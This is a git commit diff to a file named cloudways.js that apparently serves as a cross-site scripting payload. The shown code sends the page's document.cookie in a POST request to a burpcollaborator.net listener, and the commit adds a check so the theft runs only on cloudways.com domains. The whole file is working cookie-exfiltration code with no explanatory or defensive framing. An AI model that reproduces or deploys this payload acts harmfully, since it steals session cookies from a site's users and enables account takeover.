9c5f4f4d2f35a57f9d1ec8bcb5c68d94a4db5755
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-01 21:25:47 +0330

    Update cloudways.js

--- cloudways.js
+++ cloudways.js
@@ -1,5 +1,9 @@
+var text=document.domain;
+var regex=text.match(/.*cloudways.com/igm)
+if (text == regex){
 fetch('https://x860mf7w2n50vfufhi2q64rtwk2aqz.burpcollaborator.net', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
 });
+}
